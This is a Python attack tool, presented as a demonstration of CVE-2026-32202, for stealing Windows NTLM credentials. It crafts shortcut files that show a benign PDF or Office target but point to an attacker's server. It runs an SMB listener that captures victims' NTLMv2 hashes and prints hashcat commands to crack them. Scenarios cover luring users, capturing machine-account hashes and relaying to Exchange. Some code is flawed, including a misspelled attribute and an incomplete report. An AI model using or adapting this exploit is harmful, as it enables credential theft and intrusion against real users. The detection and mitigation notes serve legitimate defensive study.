#!/usr/bin/env python3
"""
🎯 KaliAgent v4 - CVE-2026-32202: Windows Shell LNK NTLM Hash Capture

Complete demonstration of CVE-2026-32202 — Protection Mechanism Failure
in Windows Shell allowing spoofing via crafted .lnk files that trigger
outbound NTLM/Kerberos authentication.

MITRE ATT&CK:
  - T1187: Forced Authentication
  - T1110.003: Password Spraying (NTLM relay)
  - T1557: Adversary-in-the-Middle (NTLM relay)

CWE-693: Protection Mechanism Failure

Attack Flow:
  1. Attacker crafts a .lnk file with a UNC path pointing to their server
  2. .lnk is placed in a location Windows will process (share, desktop, search index)
  3. Windows Shell resolves the shortcut → triggers SMB authentication
  4. Victim's NTLMv2 hash is sent to attacker's SMB server
  5. Attacker captures the hash for offline cracking or NTLM relay

⚠️  WARNING: For authorized security testing and education only.

Author: KaliAgent Team
Created: April 28, 2026
Version: 1.0.0
"""

import struct
import socket
import argparse
import sys
import os
import logging
import time
import threading
from datetime import datetime
from dataclasses import dataclass, field
from typing import List, Optional, Tuple
from pathlib import Path

logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')
logger = logging.getLogger('CVE-2026-32202')


# =============================================================================
# LNK FILE CRAFTING — MS-SHLLINK Binary Format
# =============================================================================

# Shell Link Header flags
HAS_LINK_TARGET_ID_LIST = 0x00000001
HAS_LINK_INFO = 0x00000002
HAS_NAME = 0x00000004
HAS_RELATIVE_PATH = 0x00000008
HAS_WORKING_DIR = 0x00000010
HAS_ARGUMENTS = 0x00000020
HAS_ICON_LOCATION = 0x00000040
IS_UNICODE = 0x00000080
FORCE_NO_LINK_INFO = 0x00000100
HAS_EXCLUSIVE_BLOCK = 0x00000200

# LinkInfo flags
VOLUME_ID_AND_LOCAL_BASE_PATH = 0x00000001
COMMON_NETWORK_RELATIVE_LINK = 0x00000002

# CLSID for Shell Link
SHELL_LINK_CLSID = bytes([
    0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46
])

# Show commands
SW_HIDE = 0
SW_NORMAL = 1
SW_SHOWMINIMIZED = 2
SW_SHOWMAXIMIZED = 3


@dataclass
class LNKConfig:
    """Configuration for a crafted .lnk file"""
    # Display properties
    display_name: str = "document.pdf"
    icon_path: str = r"C:\Program Files\Adobe\Acrobat DC\Acrobat\Acrobat.exe"
    icon_index: int = 0

    # Target (what the user sees in properties)
    fake_target: str = r"C:\Users\Public\Documents\report.pdf"

    # Actual UNC path (where Windows sends authentication)
    unc_server: str = r"\\192.168.1.100"
    unc_share: str = "share"
    unc_path: str = r"docs\report.pdf"

    # Shortcut behavior
    show_command: int = SW_NORMAL
    hotkey: int = 0

    # Darwin (Windows Installer) identifier — can be arbitrary
    darwin_id: str = ""


class LNKCraft:
    """
    Craft Windows Shell Link (.lnk) files per MS-SHLLINK specification.

    The key trick for CVE-2026-32202: Store a UNC path in the LinkInfo block
    while displaying a benign local path to the user. Windows Shell resolves
    the UNC path when processing the shortcut, triggering outbound SMB
    authentication — sending the victim's NTLMv2 hash to the UNC server.

    Reference: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/
    """

    HEADER_SIZE = 76  # 0x4C bytes
    CLSID_SIZE = 16

    def __init__(self, config: LNKConfig):
        self.config = config
        self._data = bytearray()

    def build(self) -> bytes:
        """Build the complete .lnk file"""
        self._data = bytearray()
        self._write_header()
        self._write_link_target_id_list()
        self._write_link_info()
        self._write_string_data()
        return bytes(self._data)

    def _write_header(self):
        """Write ShellLinkHeader (76 bytes)"""
        header = bytearray()

        # HeaderSize (4 bytes) — always 0x4C
        header += struct.pack('<I', self.HEADER_SIZE)

        # LinkCLSID (16 bytes)
        header += SHELL_LINK_CLSID

        # LinkFlags (4 bytes)
        flags = (
            HAS_LINK_TARGET_ID_LIST |
            HAS_LINK_INFO |
            HAS_NAME |
            HAS_ICON_LOCATION |
            IS_UNICODE
        )
        header += struct.pack('<I', flags)

        # FileAttributes (4 bytes) — FILE_ATTRIBUTE_NORMAL
        header += struct.pack('<I', 0x00000020)

        # CreationTime (8 bytes) — current time as FILETIME
        now = datetime.now().timestamp()
        ft = int((now + 11644473600) * 10000000)  # Unix → Windows FILETIME
        header += struct.pack('<Q', ft)

        # LastAccessTime (8 bytes)
        header += struct.pack('<Q', ft)

        # LastWriteTime (8 bytes)
        header += struct.pack('<Q', ft)

        # FileSize (4 bytes) — arbitrary
        header += struct.pack('<I', 0x00001000)

        # IconIndex (4 bytes)
        header += struct.pack('<I', self.config.icon_index)

        # ShowCommand (4 bytes)
        header += struct.pack('<I', self.config.show_command)

        # HotKey (2 bytes)
        header += struct.pack('<H', self.config.hotkey)

        # Reserved1 (2 bytes)
        header += struct.pack('<H', 0)

        # Reserved2 (4 bytes)
        header += struct.pack('<I', 0)

        # Reserved3 (4 bytes)
        header += struct.pack('<I', 0)

        assert len(header) == self.HEADER_SIZE, f"Header size mismatch: {len(header)}"
        self._data += header

    def _write_link_target_id_list(self):
        """Write LinkTargetIDList — shell item ID list pointing to UNC path"""
        id_list = bytearray()

        # Build a minimal item ID list for a UNC path
        # Item ID: CommonItemIDList format
        # For UNC paths, we create a network location shell item

        unc_full = f"{self.config.unc_server}\\{self.config.unc_share}\\{self.config.unc_path}"

        # Shell item for network location
        # Type byte: 0x1F = network location
        item = bytearray()
        item += struct.pack('<B', 0x1F)  # Type: network location
        item += b'\x00' * 2  # Unknown
        # UNC path as null-terminated Unicode
        unc_wide = unc_full.encode('utf-16-le') + b'\x00\x00'
        item += unc_wide

        # Item size includes the size field itself (2 bytes)
        item_size = len(item) + 2
        id_list += struct.pack('<H', item_size)
        id_list += item

        # Terminal item (size=0)
        id_list += struct.pack('<H', 0)

        # IDList size includes itself (2 bytes)
        id_list_size = len(id_list) + 2
        self._data += struct.pack('<H', id_list_size)
        self._data += id_list

    def _write_link_info(self):
        """Write LinkInfo block with UNC path — THIS IS THE VULNERABILITY CORE

        The LinkInfo block stores the target path information. When Windows
        Shell encounters a CommonNetworkRelativeLink with a UNC path, it
        attempts to resolve it — triggering SMB authentication.

        CVE-2026-32202: The protection mechanism that should prevent
        authentication to arbitrary servers during .lnk resolution fails.
        """
        info = bytearray()

        # LinkInfo flags — use common network relative link
        flags = COMMON_NETWORK_RELATIVE_LINK
        info += struct.pack('<I', flags)

        # Offset to VolumeID (0 if not used)
        info += struct.pack('<I', 0)

        # Offset to LocalBasePath (0 if not used)
        info += struct.pack('<I', 0)

        # CommonNetworkRelativeLink
        cnrl_offset = len(info)  # Track position for size calc

        # CNRL size placeholder (will be filled)
        cnrl_size_pos = len(info)
        info += struct.pack('<I', 0)  # Size — fill later

        # CNRL flags
        info += struct.pack('<I', 0x00000002)  # ValidNetType

        # NetworkProviderType
        info += struct.pack('<I', 0x00020000)  # WNNC_NET_LANMAN

        # Offset to NetName (relative to start of CNRL)
        cnrl_header_size = 20  # Size + Flags + ProviderType + offsets
        net_name_offset = cnrl_header_size
        info += struct.pack('<I', net_name_offset)

        # Offset to DeviceName (0 = not present)
        info += struct.pack('<I', 0)

        # NetName — the UNC server as null-terminated Unicode
        # This is what triggers the SMB authentication!
        server_name = self.config.unc_server.replace('\\', '').replace('/', '')
        net_name = server_name.encode('utf-16-le') + b'\x00\x00'
        info += net_name

        # Calculate and fill CNRL size
        cnrl_size = len(info) - cnrl_offset
        struct.pack_into('<I', info, cnrl_size_pos, cnrl_size)

        # Calculate and fill LinkInfo size
        info_size = len(info) + 4  # +4 for the size field itself
        info_with_size = struct.pack('<I', info_size) + info

        self._data += info_with_size

    def _write_string_data(self):
        """Write StringData sections (Unicode)"""
        # Name string — displayed as the shortcut name
        name = self.config.display_name.encode('utf-16-le') + b'\x00\x00'
        # CONSOLE_PROPS extra data to terminate
        self._data += struct.pack('<H', len(name) // 2)  # Count of wchars
        self._data += name

        # IconLocation string
        icon = self.config.icon_path.encode('utf-16-le') + b'\x00\x00'
        self._data += struct.pack('<H', len(icon) // 2)
        self._data += icon

        # ExtraData — Terminal block (size=4, signature=0)
        self._data += struct.pack('<I', 4)


# =============================================================================
# NTLM CAPTURE SERVER — SMB Listener for Hash Capture
# =============================================================================

@dataclass
class CapturedHash:
    """Captured NTLM authentication hash"""
    timestamp: str
    source_ip: str
    source_port: int
    username: str
    domain: str
    ntlmv2_hash: str
    challenge: str
    full_response: bytes = b""


class NTLMCaptureServer:
    """
    Minimal SMB server that captures NTLMv2 authentication hashes.

    When a victim's Windows Shell resolves a crafted .lnk file, it sends
    an SMB negotiate + session setup to the UNC path. This server:

    1. Accepts the SMB connection
    2. Sends SMB negotiate response (NTLMSSP challenge)
    3. Receives the session setup with NTLMv2 AUTH
    4. Extracts username, domain, and NTLMv2 hash
    5. Returns STATUS_ACCESS_DENIED (prevents actual session)
    6. Stores the hash for cracking or relay

    The challenge is randomly generated. The NTLMv2 response contains:
    - NTProofStr: HMAC-MD5(MD5(ServerChallenge + Blob), NTKey)
    - Blob: timestamp + client challenge + domain + server name + etc.

    For offline cracking, use: hashcat -m 5600 or john --format=netntlmv2
    """

    # SMB command codes
    SMB_COM_NEGOTIATE = 0x72
    SMB_COM_SESSION_SETUP = 0x73

    # NTLMSSP message types
    NTLMSSP_NEGOTIATE = 1
    NTLMSSP_CHALLENGE = 2
    NTLMSSP_AUTH = 3

    # NT status codes
    STATUS_SUCCESS = 0x00000000
    STATUS_ACCESS_DENIED = 0xC0000022

    def __init__(self, interface: str = "0.0.0.0", port: int = 445):
        self.interface = interface
        self.port = port
        self.captured: List[CapturedHash] = []
        self.running = False
        self.server_challenge = os.urandom(8)

    def start(self):
        """Start the SMB capture server"""
        self.running = True
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((self.interface, self.port))
        sock.listen(10)
        sock.settimeout(1.0)

        logger.info(f"🔓 NTLM Capture Server listening on {self.interface}:{self.port}")
        logger.info(f"   Server challenge: {self.server_challenge.hex()}")

        try:
            while self.running:
                try:
                    conn, addr = sock.accept()
                    t = threading.Thread(target=self._handle_connection, args=(conn, addr))
                    t.daemon = True
                    t.start()
                except socket.timeout:
                    continue
        except KeyboardInterrupt:
            pass
        finally:
            sock.close()
            logger.info("Server stopped")

    def stop(self):
        self.running = False

    def _handle_connection(self, conn: socket.socket, addr: Tuple[str, int]):
        """Handle an incoming SMB connection"""
        try:
            # Read SMB negotiate
            data = conn.recv(4096)
            if not data:
                return

            # Check if this is SMBv1 or SMBv2
            if data[0:4] == b'\xfeSMB':
                # SMB2/3 — handle differently
                self._handle_smb2(conn, addr, data)
            else:
                # SMB1
                self._handle_smb1(conn, addr, data)
        except Exception as e:
            logger.debug(f"Error handling {addr}: {e}")
        finally:
            conn.close()

    def _handle_smb1(self, conn, addr, data):
        """Handle SMBv1 negotiate + session setup"""
        logger.info(f"📡 SMB1 connection from {addr[0]}:{addr[1]}")

        # Send negotiate response with NTLMSSP challenge
        response = self._build_negotiate_response_smb1()
        conn.send(response)

        # Read session setup with NTLMSSP AUTH
        data = conn.recv(4096)
        if not data:
            return

        # Extract NTLMSSP AUTH from session setup
        auth_msg = self._find_ntlmssp_auth(data)
        if auth_msg:
            captured = self._parse_ntlmssp_auth(auth_msg, addr)
            if captured:
                self.captured.append(captured)
                self._log_capture(captured)

        # Send access denied
        conn.send(self._build_access_denied_smb1())

    def _handle_smb2(self, conn, addr, data):
        """Handle SMB2/3 negotiate + session setup"""
        logger.info(f"📡 SMB2 connection from {addr[0]}:{addr[1]}")

        # Send SMB2 negotiate response
        response = self._build_negotiate_response_smb2()
        conn.send(response)

        # Read session setup
        data = conn.recv(4096)
        if not data:
            return

        auth_msg = self._find_ntlmssp_auth(data)
        if auth_msg:
            captured = self._parse_ntlmssp_auth(auth_msg, addr)
            if captured:
                self.captured.append(captured)
                self._log_capture(captured)

        conn.send(self._build_access_denied_smb2())

    def _find_ntlmssp_auth(self, data: bytes) -> Optional[bytes]:
        """Find NTLMSSP AUTH message in SMB packet"""
        # NTLMSSP signature: 'NTLMSSP\x00'
        sig = b'NTLMSSP\x00'
        pos = data.find(sig)
        while pos >= 0:
            # Check message type (offset 8, LE uint32)
            if pos + 12 <= len(data):
                msg_type = struct.unpack_from('<I', data, pos + 8)[0]
                if msg_type == self.NTLMSSP_AUTH:
                    return data[pos:]
            pos = data.find(sig, pos + 1)
        return None

    def _parse_ntlmssp_auth(self, msg: bytes, addr: Tuple[str, int]) -> Optional[CapturedHash]:
        """Parse NTLMSSP AUTH message and extract credentials"""
        try:
            if len(msg) < 64:
                return None

            # NTLMSSP AUTH structure:
            # 0-7:   Signature ('NTLMSSP\x00')
            # 8-11:  MessageType (3 = AUTH)
            # 12-19: LanManagerResponseFields
            # 20-27: NTLMResponseFields
            # 28-35: DomainNameFields
            # 36-43: UserNameFields
            # 44-51: WorkstationFields

            # Extract domain
            dom_len, dom_max, dom_offset = struct.unpack_from('<HHI', msg, 28)
            domain = msg[dom_offset:dom_offset + dom_len]
            domain = domain.decode('utf-16-le', errors='replace').rstrip('\x00')

            # Extract username
            user_len, user_max, user_offset = struct.unpack_from('<HHI', msg, 36)
            username = msg[user_offset:user_offset + user_len]
            username = username.decode('utf-16-le', errors='replace').rstrip('\x00')

            # Extract workstation
            ws_len, ws_max, ws_offset = struct.unpack_from('<HHI', msg, 44)
            workstation = msg[ws_offset:ws_offset + ws_len]
            workstation = workstation.decode('utf-16-le', errors='replace').rstrip('\x00')

            # Extract NTLMv2 response (NTProofStr + Blob)
            ntlm_len, ntlm_max, ntlm_offset = struct.unpack_from('<HHI', msg, 20)
            ntlm_response = msg[ntlm_offset:ntlm_offset + ntlm_len]

            # NTProofStr is first 16 bytes, rest is blob
            if len(ntlm_response) >= 16:
                nt_proof = ntlm_response[:16].hex()
                blob = ntlm_response[16:]
            else:
                nt_proof = ntlm_response.hex()
                blob = b""

            # Format as hashcat input: domain::username:challenge:ntproof:blob
            challenge_hex = self.server_challenge.hex()
            blob_hex = blob.hex()

            hash_str = f"{domain}::{username}:{challenge_hex}:{nt_proof}:{blob_hex}"

            return CapturedHash(
                timestamp=datetime.now().isoformat(),
                source_ip=addr[0],
                source_port=addr[1],
                username=username,
                domain=domain,
                ntlmv2_hash=hash_str,
                challenge=challenge_hex,
                full_response=ntlm_response
            )
        except Exception as e:
            logger.error(f"Failed to parse NTLMSSP AUTH: {e}")
            return None

    def _log_capture(self, captured: CapturedHash):
        """Log a captured hash"""
        logger.info(f"🔑 CAPTURED NTLMv2 HASH!")
        logger.info(f"   Domain:     {captured.domain}")
        logger.info(f"   Username:   {captured.username}")
        logger.info(f"   Source:      {captured.source_ip}:{captured.source_port}")
        logger.info(f"   Challenge:   {captured.challenge}")
        logger.info(f"   Hash:       {captured.ntlmv2_hash}")
        logger.info(f"   Hashcat:    hashcat -m 5600 '{captured.ntlmmv2_hash}'")
        logger.info(f"   John:       john --format=netntlmv2 hash.txt")

    def _build_negotiate_response_smb1(self) -> bytes:
        """Build SMB1 negotiate response with NTLMSSP challenge"""
        # NTLMSSP Type 2 (Challenge) message
        ntlmssp = bytearray()
        ntlmssp += b'NTLMSSP\x00'                    # Signature
        ntlmssp += struct.pack('<I', self.NTLMSSP_CHALLENGE)  # MessageType
        ntlmssp += struct.pack('<I', 0x00018282)      # TargetInfoFields (NTLMv2)
        ntlmssp += self.server_challenge               # ServerChallenge (8 bytes)
        ntlmssp += b'\x00' * 8                        # Reserved
        ntlmssp += struct.pack('<Q', 0x0000000200000080)  # TargetInfo

        # NetBIOS + SMB1 header
        nbss = bytearray()
        nbss += b'\x00'  # Session message
        smb_header = bytearray()
        smb_header += b'\xffSMB'  # SMB1 magic
        smb_header += struct.pack('<B', 0)  # Command: Negotiate response
        smb_header += struct.pack('<I', 0)  # Status
        smb_header += struct.pack('<B', 0x98)  # Flags
        smb_header += struct.pack('<H', 0)  # Flags2
        smb_header += b'\x00' * 12  # PID/MID/PID etc
        smb_header += struct.pack('<H', 0)  # TID
        smb_header += struct.pack('<H', 0)  # PID
        smb_header += struct.pack('<H', 0)  # UID
        smb_header += struct.pack('<H', 0)  # MID

        # Build full response
        response = bytes(nbss) + bytes(smb_header) + bytes(ntlmssp)
        return response

    def _build_negotiate_response_smb2(self) -> bytes:
        """Build SMB2 negotiate response"""
        resp = bytearray()
        # SMB2 header
        resp += b'\xfeSMB'  # SMB2 magic
        resp += struct.pack('<H', 64)  # StructureSize
        resp += struct.pack('<H', 0)  # CreditCharge
        resp += struct.pack('<I', 1)  # Status
        resp += struct.pack('<H', 0)  # Command: Negotiate
        resp += struct.pack('<H', 1)  # CreditRequest
        resp += struct.pack('<I', 0)  # Flags
        resp += struct.pack('<I', 0)  # NextCommand
        resp += struct.pack('<Q', 0)  # MessageId
        resp += struct.pack('<I', 0)  # Reserved
        resp += struct.pack('<I', 0)  # TreeId
        resp += struct.pack('<Q', 0)  # SessionId
        resp += b'\x00' * 16  # Signature

        # Negotiate response body
        resp += struct.pack('<H', 65)  # StructureSize
        resp += struct.pack('<H', 0x0210)  # SecurityMode
        resp += struct.pack('<H', 0)  # DialectRevision (SMB 2.0.2)
        resp += struct.pack('<H', 0)  # NegotiateContextCount
        resp += struct.pack('<I', 0)  # ServerGuid (first 4 bytes)
        resp += struct.pack('<I', 0)  # ServerGuid (next 4 bytes)
        resp += struct.pack('<I', 0)  # ServerGuid
        resp += struct.pack('<I', 0)  # ServerGuid
        resp += struct.pack('<I', 0x7f)  # Capabilities
        resp += struct.pack('<I', 0)  # MaxTransactSize
        resp += struct.pack('<I', 0)  # MaxReadSize
        resp += struct.pack('<I', 0)  # MaxWriteSize
        resp += struct.pack('<Q', 0)  # SystemTime
        resp += struct.pack('<Q', 0)  # ServerStartTime
        resp += struct.pack('<H', 128)  # SecurityBufferOffset
        resp += struct.pack('<H', 0)   # SecurityBufferLength
        resp += struct.pack('<I', 0)   # NegotiateContextOffset

        # NTLMSSP Type 2
        ntlmssp = bytearray()
        ntlmssp += b'NTLMSSP\x00'
        ntlmssp += struct.pack('<I', self.NTLMSSP_CHALLENGE)
        ntlmssp += struct.pack('<I', 0x00018282)
        ntlmssp += self.server_challenge
        ntlmssp += b'\x00' * 8
        ntlmssp += struct.pack('<Q', 0x0000000200000080)
        resp += ntlmssp

        return bytes(resp)

    def _build_access_denied_smb1(self) -> bytes:
        """Build SMB1 access denied response"""
        resp = bytearray()
        resp += b'\x00'  # NetBIOS session
        resp += b'\xffSMB'
        resp += struct.pack('<B', 0x73)  # Session Setup
        resp += struct.pack('<I', self.STATUS_ACCESS_DENIED)
        resp += struct.pack('<B', 0x98)
        resp += b'\x00' * 55
        return bytes(resp)

    def _build_access_denied_smb2(self) -> bytes:
        """Build SMB2 access denied response"""
        resp = bytearray()
        resp += b'\xfeSMB'
        resp += struct.pack('<H', 64)
        resp += struct.pack('<H', 0)
        resp += struct.pack('<I', self.STATUS_ACCESS_DENIED)
        resp += struct.pack('<H', 1)  # Session Setup
        resp += struct.pack('<H', 0)
        resp += struct.pack('<I', 0)
        resp += struct.pack('<I', 0)
        resp += struct.pack('<Q', 1)
        resp += struct.pack('<I', 0)
        resp += struct.pack('<I', 0)
        resp += struct.pack('<Q', 0)
        resp += b'\x00' * 16
        resp += struct.pack('<H', 9)
        resp += b'\x00' * 6
        return bytes(resp)


# =============================================================================
# DEMONSTRATION SCENARIOS
# =============================================================================

@dataclass
class AttackScenario:
    """Attack scenario definition"""
    name: str
    description: str
    technique: str
    mitre: str
    luring_method: str
    target_path: str
    unc_path: str
    risk: str
    detection: List[str] = field(default_factory=list)
    mitigation: List[str] = field(default_factory=list)


SCENARIOS = [
    AttackScenario(
        name="File Share Browsing",
        description="User browses a file share containing a crafted .lnk — Windows "
                    "Shell resolves the shortcut and authenticates to the UNC path",
        technique="Forced Authentication via .lnk",
        mitre="T1187",
        luring_method="User browses \\\\fileserver\\share\\, sees 'Q3_Report.lnk'",
        target_path=r"C:\Users\Public\Documents\Q3_Report.pdf",
        unc_path=r"\\attacker-server\share\Q3_Report.pdf",
        risk="NTLMv2 hash of the browsing user sent to attacker",
        detection=[
            "Monitor for outbound SMB connections to unusual IPs",
            "Check .lnk files for UNC paths in LinkInfo block",
            "Event ID 4624 logon type 3 from unexpected sources",
            "Network IDS: SMB sessions to non-domain IPs",
        ],
        mitigation=[
            "Apply KB5082198 (April 2026 Patch Tuesday)",
            "Block outbound SMB (ports 139/445) at network boundary",
            "Enable LDAP signing and NTLM restrictions",
            "Disable Windows Search indexing of untrusted shares",
        ]
    ),
    AttackScenario(
        name="Desktop Shortcut",
        description="Attacker places a crafted .lnk on the user's desktop via "
                    "phishing or lateral movement. When the user logs in, Windows "
                    "Shell processes desktop shortcuts automatically.",
        technique="Persistence + Forced Authentication",
        mitre="T1187 + T1547",
        luring_method="Malicious .lnk dropped to Desktop folder via initial access",
        target_path=r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
        unc_path=r"\\attacker\IPC$",
        risk="NTLMv2 hash captured on every login; SYSTEM hash if Search Indexer processes it",
        detection=[
            "Monitor Desktop and Startup folders for new .lnk files",
            "Check .lnk files with 'type' command or LNK parsers",
            "Look for SMB auth events to non-domain servers",
        ],
        mitigation=[
            "Apply April 2026 security updates",
            "Restrict write access to Desktop/Startup folders via GPO",
            "Enable Credential Guard to protect NTLM hashes",
            "Use RestrictedAdmin mode for RDP/SMB",
        ]
    ),
    AttackScenario(
        name="Search Indexer SYSTEM Hash",
        description="If the .lnk is in an indexed location, SearchProtocolHost.exe "
                    "processes it as SYSTEM. This yields NTLMv2 hash of the machine "
                    "account — which can be used for Silver Ticket attacks.",
        technique="Machine Account NTLM Capture",
        mitre="T1187 + T1606",
        luring_method="Place .lnk in indexed location (e.g., Users\\Public\\Documents)",
        target_path=r"C:\Windows\notepad.exe",
        unc_path=r"\\attacker\IPC$",
        risk="NTLMv2 hash of COMPUTER$ account — can forge Kerberos Silver Tickets",
        detection=[
            "Monitor for SMB auth from SearchProtocolHost.exe",
            "Check for SearchProtocolHost authenticating to non-domain IPs",
            "Event ID 4624 with machine account source",
        ],
        mitigation=[
            "Apply April 2026 patches",
            "Exclude untrusted paths from Windows Search index",
            "Disable MSSense (Cortana) on enterprise systems",
            "Block outbound SMB from indexer service accounts",
        ]
    ),
    AttackScenario(
        name="NTLM Relay to Exchange",
        description="Captured NTLMv2 hash is relayed (not cracked) to Exchange/AD CS "
                    "for mailbox access or certificate enrollment — no cracking needed.",
        technique="NTLM Relay (No Crack Required)",
        mitre="T1557.001",
        luring_method="Same .lnk triggers auth, but relay instead of capture",
        target_path=r"C:\Program Files\Internet Explorer\iexplore.exe",
        unc_path=r"\\attacker-relay\IPC$",
        risk="Direct access to Exchange mailbox or AD CS without knowing the password",
        detection=[
            "Monitor for NTLM relay patterns (auth to multiple services)",
            "EWS/AD CS access from unusual IPs with valid credentials",
            "Correlation: same auth appearing on multiple services simultaneously",
        ],
        mitigation=[
            "Apply April 2026 patches",
            "Enable Extended Protection for Authentication (EPA)",
            "Require TLS channel binding on AD CS",
            "Enable LDAP signing and channel binding",
        ]
    ),
]


# =============================================================================
# DEMO ORCHESTRATOR
# =============================================================================

class CVE2026_32202_Demo:
    """
    Complete demonstration orchestrator for CVE-2026-32202.

    Provides:
    1. LNK file generation with various attack scenarios
    2. NTLM capture server for hash collection
    3. Scenario walkthrough with explanations
    4. Detection and mitigation guidance
    """

    VERSION = "1.0.0"

    def __init__(self):
        self.craft = None
        self.server = None
        self.output_dir = Path("./cve-2026-32202-output")

    def generate_lnk(self, scenario: int = 0, attacker_ip: str = "192.168.1.100",
                      output_dir: str = None) -> str:
        """Generate a crafted .lnk file for the specified scenario"""
        sc = SCENARIOS[scenario]
        self.output_dir = Path(output_dir) if output_dir else self.output_dir
        self.output_dir.mkdir(parents=True, exist_ok=True)

        config = LNKConfig(
            display_name=sc.name.replace(" ", "_") + ".lnk",
            fake_target=sc.target_path,
            unc_server=f"\\\\{attacker_ip}",
            unc_share="share",
            unc_path="docs",
        )

        craft = LNKCraft(config)
        lnk_data = craft.build()

        # Write .lnk file
        filename = f"{sc.name.replace(' ', '_').lower()}_cve-2026-32202.lnk"
        filepath = self.output_dir / filename
        filepath.write_bytes(lnk_data)

        logger.info(f"📝 Generated .lnk file: {filepath}")
        logger.info(f"   Display target: {config.fake_target}")
        logger.info(f"   UNC path:       {config.unc_server}\\{config.unc_share}\\{config.unc_path}")
        logger.info(f"   File size:      {len(lnk_data)} bytes")

        return str(filepath)

    def generate_all_lnk(self, attacker_ip: str = "192.168.1.100",
                          output_dir: str = None) -> List[str]:
        """Generate .lnk files for all scenarios"""
        files = []
        for i in range(len(SCENARIOS)):
            f = self.generate_lnk(i, attacker_ip, output_dir)
            files.append(f)
        return files

    def start_capture_server(self, interface: str = "0.0.0.0", port: int = 445):
        """Start the NTLM capture server"""
        self.server = NTLMCaptureServer(interface, port)
        t = threading.Thread(target=self.server.start, daemon=True)
        t.start()
        logger.info(f"🔓 Capture server started on {interface}:{port}")
        return self.server

    def print_scenario(self, scenario: int = 0):
        """Print detailed scenario walkthrough"""
        sc = SCENARIOS[scenario]
        print(f"""
╔══════════════════════════════════════════════════════════════════╗
║  CVE-2026-32202: {sc.name:<47}║
╚══════════════════════════════════════════════════════════════════╝

📋 DESCRIPTION
  {sc.description}

🎯 TECHNIQUE
  {sc.technique}
  MITRE ATT&CK: {sc.mitre}

🪝 LURING METHOD
  {sc.luring_method}

📂 TARGET PATH (displayed to user)
  {sc.target_path}

🌐 UNC PATH (actual authentication target)
  {sc.unc_path}

⚠️  RISK
  {sc.risk}

🔍 DETECTION""")
        for d in sc.detection:
            print(f"  • {d}")
        print(f"""
🛡️  MITIGATION""")
        for m in sc.mitigation:
            print(f"  • {m}")

    def print_attack_flow(self):
        """Print the complete attack flow diagram"""
        print("""
╔══════════════════════════════════════════════════════════════════╗
║           CVE-2026-32202 — ATTACK FLOW                         ║
╚══════════════════════════════════════════════════════════════════╝

  ┌──────────────┐     ┌──────────────┐     ┌──────────────┐
  │   Attacker   │     │   Victim     │     │  Attacker    │
  │   (Craft)    │     │  (Windows)   │     │  (Capture)   │
  └──────┬───────┘     └──────┬───────┘     └──────┬───────┘
         │                    │                     │
    1. Craft .lnk        2. User browses       3. SMB server
       with UNC          share / desktop       listens on
       path to           containing .lnk       port 445
       attacker                                │
         │                    │                │
         │            ┌──────┴──────┐          │
         │            │ Windows     │          │
         │            │ Shell       │          │
         │            │ resolves    │          │
         │            │ .lnk → UNC  │          │
         │            └──────┬──────┘          │
         │                   │                 │
         │                   │ 4. SMB AUTH    │
         │                   │ (NTLMv2 hash)  │
         │                   ├────────────────►│
         │                   │                 │
         │                   │  5. ACCESS_     │
         │                   │  DENIED         │
         │                   │◄────────────────┤
         │                   │                 │
         │                   │            6. Hash stored
         │                   │            for cracking
         │                   │            or NTLM relay
         ▼                   ▼                 ▼

  KEY INSIGHT: Windows Shell processes .lnk files WITHOUT user
  interaction in several cases:
    • Browsing a file share (Explorer preview)
    • Search Indexer (SearchProtocolHost as SYSTEM)
    • MSSense/Cortana indexing (as SYSTEM)
    • Desktop icon refresh on login

  The .lnk LinkInfo block contains a UNC path (CommonNetworkRelativeLink).
  When Windows resolves this, it initiates SMB authentication to the
  UNC server — sending the user's NTLMv2 hash in the process.

  CVE-2026-32202 specifically: The protection mechanism that should
  prevent this forced authentication FAILS, allowing the spoofing.""")

    def generate_report(self) -> str:
        """Generate a complete markdown report"""
        report = []
        report.append("# CVE-2026-32202: Windows Shell Spoofing Vulnerability")
        report.append("")
        report.append("**Date:** " + datetime.now().strftime('%Y-%m-%d'))
        report.append("**Tool:** KaliAgent v4 — CVE-2026-32202 Demo v1.0.0")
        report.append("")
        report.append("## Summary")
        report.append("")
        report.append("Protection mechanism failure in Windows Shell (CWE-693) allows an")
        report.append("unauthorized attacker to perform spoofing over a network by crafting")
        report.append(".lnk files that trigger outbound NTLM/Kerberos authentication.")
        report.append("")
        report.append("## CVSS")
        report.append("- **Score:** 4.3 MEDIUM")
        report.append("- **Vector:** AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N")
        report.append("- **EPSS:** 0.07% → **Actively exploited in the wild**")
        report.append("")
        report.append("## Attack Scenarios")
        report.append("")
        for i, sc in enumerate(SCENARIOS):
            report.append(f"### {i+1}. {sc.name}")
            report.append(f"**{sc.description}**")
            report.append(f"- **Technique:** {sc.technique} ({sc.mitre})")
            report.append(f"- **Risk:** {sc.risk}")
            report.append(f"- **Detection:**")
            for d in sc.detection:
                report.append(f"  - {d}")
            report.append(f"- **Mitigation:**")
            for m in sc.mitigation:
                report.append(f"  - {m}")
            report.append("")
        report.append("## Patches")
        report.append("")
        report.append("| Platform | KB |")
        report.append("|----------|----|")
        report.append("| Windows 10 1607 | KB5082198 |")
        report.append("| Windows 10 1809 | KB5082123 |")
        report.append("| Windows 10 21H2/22H2 | KB5082200 |")
        report.append("| Windows 11 23H2 | KB5082052 |")
        report.append("| Windows 11 24H2/25H2 | KB5083769 |")
        report.append("| Windows Server 2012 | KB5082127 |")
        report.append("| Windows Server 2016 | KB5082198 |")
        report.append("| Windows Server 2019 | KB5082123 |")
        report.append("| Windows Server 2022 | KB5082142 |")
        report.append("| Windows Server 2025 | KB5082063 |")
        report.append("")
        report.append("## Captured Hashes")
        report.append("")
        if self.server and self.server.captured:
            report.append(f"**Total captured:** {len(self.server.captured)}")
            report.append("")
            report.append("```")
            for h in self.server.captured:
                report.append(f"{h.ntlmv2_hash}")
            report.append("```")
        else:
            report.append("No hashes captured yet.")
        report.append("")
        report.append("## Cracking")
        report.append("")
        report.append("```bash")
